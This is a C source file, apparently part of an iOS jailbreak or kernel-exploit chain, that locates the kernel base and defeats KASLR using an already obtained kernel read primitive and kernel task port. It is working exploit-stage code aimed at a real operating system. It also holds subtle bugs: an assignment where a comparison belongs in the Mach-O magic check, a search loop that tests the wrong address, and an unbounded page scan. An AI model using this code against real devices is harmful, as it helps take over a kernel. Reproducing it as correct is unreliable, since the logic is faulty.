#define KERNEL_SLIDE_EXTERN

#include "slide.h"

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <mach-o/loader.h>

#include "mach_vm.h"

#include "kernel_memory.h"
#include "tasks.h"

bool is_kernel_base(uint64_t base)
{
	struct mach_header_64 header = {};

	bool ok = kernel_read(base, &header, sizeof(header));

	if(!ok)
	{
		return false;
	}

	if(!(header.magic = MH_MAGIC_64 &&
		header.filetype == MH_EXECUTE &&
		header.ncmds > 2))
		return false;

	return true;
}

bool init_with_kernel_image_address(uint64_t address)
{
	uint64_t base = STATIC_ADDRESS(kernel_base);

	if(base > address)
		return false;

	address = base + ((address - base) / PAGE_SIZE) * PAGE_SIZE;

	while(address >= base)
	{
		bool found = is_kernel_base(base);

		if(found)
		{
			kernel_base = address;
			kernel_slide = address - base;

			return true;
		}

		address -= PAGE_SIZE;
	}

	return false;
}

bool init_with_current_task()
{
	mach_port_t host = mach_host_self();

	uint64_t host_port;

	bool ok = kernel_ipc_port_lookup(current_task, host, &host_port, NULL);

	mach_port_deallocate(mach_task_self(), host);

	if(!ok)
		return false;

	uint64_t realhost = kernel_read64(host_port + OFFSET(ipc_port, ip_kobject));

	return init_with_kernel_image_address(realhost);
}

bool find_kernel_base()
{
	uint64_t kernel_region_base = 0xfffffff000000000;
	uint64_t kernel_region_end = 0xfffffffbffffc000;

	uint64_t kernel_ptr = (uint64_t)(-1);

	mach_vm_address_t address = 0;

	while(1)
	{
		mach_vm_size_t size = 0;
		
		uint32_t depth = 2;

		struct vm_region_submap_info_64 info;

		mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;

		kern_return_t kr = mach_vm_region_recurse(kernel_task_port,
												  &address,
												  &size,
												  &depth,
												  (vm_region_recurse_info_t) &info,
												  &count);

		if(kr != KERN_SUCCESS)
		{
			break;
		}

		int prot = VM_PROT_READ | VM_PROT_WRITE;

		if(info.user_tag != 12
		    || depth != 1
		    || (info.protection & prot) != prot
		    || info.pages_resident * 0x4000 != size)
			goto next;

		for(size_t offset = 0; offset < size; offset += 0x4000)
		{
			uint64_t value = 0;

			bool ok = kernel_read(address + offset,
								  &value,
								  sizeof(value));

			if(ok
			   && kernel_region_base <= value
			   && value < kernel_region_end
			   && value < kernel_ptr)
			{
				kernel_ptr = value;
			}
		}


next:
		address += size;
	}

	if(kernel_ptr == (uint64_t)(-1))
	{
		fprintf(stderr, "%s failed!\n", "find kernel pointer in heap region");
		return false;
	}

	uint64_t page = kernel_ptr & ~0x3fff;

	while(1)
	{
		bool found = is_kernel_base(page);

		if(found)
		{
			kernel_slide = page - STATIC_ADDRESS(kernel_base);

			return true;
		}

		page -= 0x4000;
	}

	return false;
}


bool kernel_slide_init()
{
	bool ok = false;

	if(kernel_slide != 0)
		return true;

	STATIC_ADDRESS(kernel_base) = 0xFFFFFFF007004000;

	if(current_task != 0)
	{
		ok = init_with_current_task();

		return ok;
	}

	ok = find_kernel_base();

	if(!ok)
	{
		fprintf(stderr, "Could not find kernel base!\n");

		return ok;
	}

	fprintf(stdout, "Found kernel base at %p!\n", (void*) kernel_base);

	return ok;
}